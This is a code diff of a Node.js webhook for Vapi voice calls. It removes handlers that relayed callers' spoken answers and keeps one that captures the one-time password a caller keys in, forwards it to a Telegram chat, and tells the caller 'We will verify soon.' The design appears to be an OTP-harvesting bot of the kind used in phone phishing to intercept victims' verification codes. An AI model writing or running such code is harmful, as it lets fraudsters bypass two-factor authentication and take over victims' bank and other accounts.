@@ -171,96 +171,36 @@ module.exports = async function handler(req, res) {
     }
   }
 
-   // ===== VAPI CONVERSATION UPDATE HANDLER =====
-if (body?.message?.type === "conversation.update") {
-  const messages = body.message.messages || [];
+  // ===== VAPI TOOL CALL HANDLER (OTP) =====
+  if (body?.message?.type === "tool-calls") {
+    const toolCall = body.message.toolCallList?.[0];
+    if (!toolCall) return res.status(200).send("OK");
 
-  const lastMsg = messages[messages.length - 1];
+    const toolCallId = toolCall.id;
 
-  if (lastMsg?.role === "user" && lastMsg?.content) {
-    const text = lastMsg.content.trim();
+    let enteredOtp = toolCall.function?.arguments?.otp || "";
+    enteredOtp = enteredOtp.replace(/[^0-9]/g, ""); // remove #
+
     const phone = body.message.call?.customer?.number;
-
-    console.log("VOICE (conversation):", text);
-
     const user = phone ? await User.findOne({ phone }) : null;
 
     if (user?.chatId) {
       await bot.sendMessage(
         user.chatId,
-        `🗣 Voice response: ${text}`
+        `🔢 OTP entered via call: ${enteredOtp}`
       );
     }
-  }
 
-  return res.status(200).send("OK");
-}
-
-   // ===== VAPI VOICE TRANSCRIPT HANDLER =====
-if (body?.message?.type === "transcript") {
-  const text = body.message.text?.trim();
-  const phone = body.message.call?.customer?.number;
-
-  console.log("VOICE TEXT:", text);
-
-  if (!text) {
-    return res.status(200).send("OK");
-  }
-
-  const user = phone ? await User.findOne({ phone }) : null;
-
-  if (user?.chatId) {
-    await bot.sendMessage(
-      user.chatId,
-      `🗣 Voice response: ${text}`
-    );
-  }
-
-  // Optional: End call on yes/no
-  if (["yes", "no"].includes(text.toLowerCase())) {
     return res.status(200).json({
-      actions: [{ type: "end-call" }]
+      results: [
+        {
+          toolCallId,
+          result: "Thank you. We will verify soon."
+        }
+      ]
     });
   }
 
-  return res.status(200).send("OK");
-}
-
-  // ===== VAPI TOOL CALL HANDLER (OTP) =====
-if (body?.message?.type === "tool-calls") {
-  const toolCall = body.message.toolCallList?.[0];
-  if (!toolCall) return res.status(200).send("OK");
-
-  const toolCallId = toolCall.id;
-
-  let enteredOtp = toolCall.function?.arguments?.otp || "";
-  enteredOtp = enteredOtp.replace(/[^0-9]/g, ""); // remove #
-
-  const phone = body.message.call?.customer?.number;
-  const user = phone ? await User.findOne({ phone }) : null;
-
-  if (user?.chatId) {
-    await bot.sendMessage(
-      user.chatId,
-      `🔢 OTP entered via call: ${enteredOtp}`
-    );
-  }
-
-  return res.status(200).json({
-    results: [
-      {
-        toolCallId,
-        result: "Thank you. We will verify soon."
-      }
-    ],
-    actions: [
-      {
-        type: "end-call"
-      }
-    ]
-  });
-}
-
-// ✅ FALLBACK RESPONSE
+  // ✅ FALLBACK RESPONSE
   return res.status(200).send("OK");
 };
